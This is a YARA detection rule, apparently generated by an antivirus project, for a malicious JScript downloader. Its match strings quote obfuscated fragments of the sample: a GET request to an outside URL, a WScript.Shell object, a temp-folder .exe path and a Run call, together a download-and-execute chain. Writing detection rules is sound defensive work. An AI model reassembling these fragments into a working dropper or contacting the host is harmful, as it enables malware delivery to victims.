rule sig_20160330_c8a418dbf1f08b7b3e8087d0e7526890 {
  meta:
    description = "datamaliciousorder - file 20160330_c8a418dbf1f08b7b3e8087d0e7526890.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "22098ce21bf5197d7c9d6eae7c78fb72f5022f711e098e28167ea8d138f4e2f0"

  strings:
    $s1  = "T2[DC](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "var IL = function AH() {return WScript[H0](\"WScript\"+\".Shell\");}(), X = 11;" fullword ascii
    $s3  = "function H(X0, E){Y = Y * 1; return X0 - E;};" fullword ascii
    $s4  = "if (T2[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MK() {return IL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DltRjnCHQ.ex\" + \"e\";};" fullword ascii
    $s6  = "function T0(){return ZY + \"\";};" fullword ascii
    $s7  = "function YO(M0){IL[\"Run\"](M0, Y, Y);};" fullword ascii
    $s8  = "function R() {return ((T1 == true) && (T1 == ZO)) ? 1 : Y;};" fullword ascii
    $s9  = "function O(){return 22;};" fullword ascii
    $s10 = "function T()" fullword ascii
    $s11 = "}while (ZG);" fullword ascii
    $s12 = "function JB(){return H0;};" fullword ascii
    $s13 = "function U(YG) {var LX = (1, 2, 3, 4, 5, YG); return LX;};" fullword ascii
    $s14 = "return H(M1, IV);" fullword ascii
    $s15 = "var OS = new this[\"Date\"]();" fullword ascii
    $s16 = "var G = false;" fullword ascii
    $s17 = "ZO = true; " fullword ascii
    $s18 = "T1 = true; " fullword ascii
    $s19 = "var T1 = false;" fullword ascii
    $s20 = "var ZO = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}